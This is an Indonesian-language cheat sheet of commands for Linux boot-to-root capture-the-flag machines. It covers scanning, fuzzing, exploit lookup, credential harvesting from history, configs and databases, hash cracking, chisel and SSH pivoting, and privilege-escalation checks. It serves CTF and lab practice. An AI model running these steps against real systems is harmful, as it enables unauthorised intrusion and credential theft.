# Template proses main CTF boot to root (Linux)

![img](https://raw.githubusercontent.com/Tomba-Hopkins/Warung-Sidi/refs/heads/main/img/menu/2.jpg)


# Links
- dah buat versi UI nya 
- github: https://github.com/zams-putra/b2r-framework
- webnya: https://b2r-framework.vercel.app/

# Foothold

- ini adalah template2 ku buat main ctf b2r
- kedepannya akan ku update selalu

## Scanning Service with nmap
- cek tcp
```bash
nmap -sCV --min-rate 1000 [ip] -vv -oN scan.nmap -p-
```

- cek udp
```bash
nmap -sU --min-rate 1000 [ip] -vv -oN scan_udp.nmap -p- 
```

## FTP check
kalau anonymous di FTP target nyala
```bash
ftp [ip] 21
[login with: Anonymous:Anonymous]
```
- check file di ftp, kali aja ada file penting dan download aja
```bash
ls -la
get [namafile.ekstensi]
```

## Fuzzing directory
ini dipakai kalau ip ada service web nya
- with gobuster
```bash
gobuster dir -u http://[ip] -w ~/wordlists/seclists/web-content/common.txt | tee dir.txt
```
- with dirsearch (kalau gobuster gabisa)
```bash
dirsearch -u http://[ip] -w ~/wordlists/seclists/web-content/common.txt
```

## Fuzzing Subdomain
kali aja web nya pakai domain misal http://nasgor.jmk
- with gobuster
```bash
gobuster vhost -u nasgor.jmk -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt --append-domain | tee subdo.txt
```
- with ffuf
```bash
ffuf -u "http://nasgor.jmk" -H "HOST: FUZZ.nasgor.jmk" -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt  -fw 522
```
- kalau response nya banyak (false positive, filter length nya)
```bash
ffuf -u "http://nasgor.jmk" -H "HOST: FUZZ.nasgor.jmk" -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt  -fw (jumlah length nya)
```


## Check Exploit
kali aja webnya vuln sama public Exploit
- check versi di source code nya (ctrl + u) di browser lalu cek2 di comment atau source kali aja ada versi
- kalau ada bisa lanjutkan cari public exploit nya
- di google / exploitdb / github
```txt
cari aja di google: [nama aplikasi] [versi] exploit
contoh keyword: nasgorApp V2.2.9 exploit
```
- di searchsploit 
```bash
searchsploit nasgorApp V2.2.9
```

- di msfconsole
```bash
msfconsole
search nasgorApp V2.2.9
```


# Privilege Escalation
- mencantum either mau horizontal privesc atau vertical privesc

## low hanging fruit
- cek env
```bash
env
```
- bash history
```bash
cat ~/.bash_history
```

## Groups etc
- cek kali aja groups docker dan siapa tau bisa docker group escape
```bash
id
```

## Credential Enum
- bisa cek2 file config, bisa cek2 file db
```bash
cat config.php | grep password

# kalo ada file db
file data.db # misal output sqlite

sqlite3 data.db
.tables
select * from users;
```
- bisa iseng2 cek mysql kalau ada
```bash
mysql -u root -p [blank]
```
### Credential Enum - Check dari log internal service
- kali aja ada log yg muncul key atau password dari beberapa service
```bash
ps aux | grep [service]
```

## Cracking pass 
- kalau misal hasil creds enum tadi passnya di hash
- bisa aja langsung visit ini dulu: https://crackstation.net/
- kalau gabisa john aja coba
```bash
john hash /file/ke/rockyou.txt

hashcat --identify 'hash'
hashcat -m [output_diatas] -w /file/ke/rockyou
```

## Pivoting
- cek internal service yg jalan
```bash
netstat -tulnp | grep 127.0.0.1
```
- sebelum port forwarding bisa cek2 curl dulu, biasanya muncul app nya apa 
```bash
curl 127.0.0.1:[port_nya]
```
- ssh port forwarding, ini dipake kalo tau passwordnya atau ga kalo ada id_rsa 
```bash
ssh -L [mau_taruh_diport_mana]:127.0.0.1:[mau_run_port_internal_service_mana] [username_target]@[ip_target]

ssh -L 6060:127.0.0.1:80 cave_man@10.10.10.10 # nanti buka 127.0.0.1:6060 di browsermu jadi port 80 nya mereka
# also kalau ada internal service di 4444, cek di browser juga possible ada
```
- udah sih, keknya kalau dah connect dia bisa cek2 internal service port lain
- chisel port forwarding
```bash
# di mesin attacker
./chisel server -p [mau_port_mana] --reverse
./chisel server -p 8000 --reverse

# di mesin victim, make sure upload dulu ke mesin target, pake wget kah pake apa aja bebas
# case misal yg jalan internal service port 8888 sama 5000, kalau chisel kudu 2 cuy
./chisel client [ip_attacker]:[port_reverse] R:[internal_service1]:127.0.0.1:[internal_service1] R:[internal_service2]:127.0.0.1:[internal_service2]
./chisel client 10.10.10.10:8000 R:5000:127.0.0.1:5000 R:8888:127.0.0.1:8888
# lansgung buka aja port 5000 di browser sama port 8888, 127.0.0.1:8000 127.0.0.1:5000
```


## Check sudo 
```bash
sudo -l
```

## Check crontab
```bash
cat /etc/crontab
```

## Check Writeable file
- cek di /etc kali aja ada file service conf yg writeable 
- bisa di combine sama incron siapa tau
```bash
cat /etc/incron.d/*
find /etc -writable 2>/dev/null
```

# Under Construction - masih belum selesai ( soon )